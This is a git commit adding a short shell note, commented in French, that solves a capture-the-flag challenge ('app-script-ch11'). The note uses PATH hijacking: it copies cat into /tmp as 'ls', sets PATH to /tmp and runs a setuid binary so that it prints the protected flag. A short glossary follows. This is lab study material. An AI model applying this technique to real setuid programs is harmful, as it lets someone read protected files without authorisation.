83477a6460260c477cd7094bddd8ca88c02fffe8
Qubits-ops <72653472+Qubits-ops@users.noreply.github.com>
2020-12-05 03:09:41 +0100

    Create bash_system1.sh

---
+++ bash_system1.sh
@@ -0,0 +1,10 @@
+app-script-ch11@challenge02:~$ cp /bin/cat /tmp/ls#copier executable dans tmp et executer cat a la place de ls, ls = liste le contenu d'un répertoire, cat =  lire un contenu textuel 
+app-script-ch11@challenge02:~$ PATH=/tmp #changer la valeur de la variable d'environnement. PATH est la variable d'env
+app-script-ch11@challenge02:~$ echo $PATH #afficher la var d'environnement 
+app-script-ch11@challenge02:~$ ./ch11 #executer le programme le flag devrais s'afficher.
+
+rappel legende:
+env = environnement
+ls = liste le contenu d'un répertoire
+cat = lire un contenu textuel
+PATH = var d'environnement
